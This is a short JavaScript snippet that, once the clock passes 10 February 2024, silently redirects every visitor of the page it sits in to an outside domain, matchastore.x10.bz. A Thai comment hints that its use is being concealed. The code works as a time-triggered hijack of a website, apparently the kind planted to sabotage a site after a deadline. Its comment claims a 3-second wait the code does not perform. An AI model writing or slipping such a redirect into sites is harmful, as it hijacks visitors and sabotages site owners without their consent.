<script>
  var dueDate = new Date("2/10/2024 00:00:00"); // specify the due date and time in mm/dd/yyyy hh:mm:ss format
  var currentDate = new Date();
  
  if (currentDate >= dueDate) {
    setTimeout(function(){
      window.location.href = "https://matchastore.x10.bz/"; <!--กูเขียนไห้ไม่บอกวิธีใช่หลอก -->
    }, 0);  // wait for 3 seconds before redirecting
  }
</script>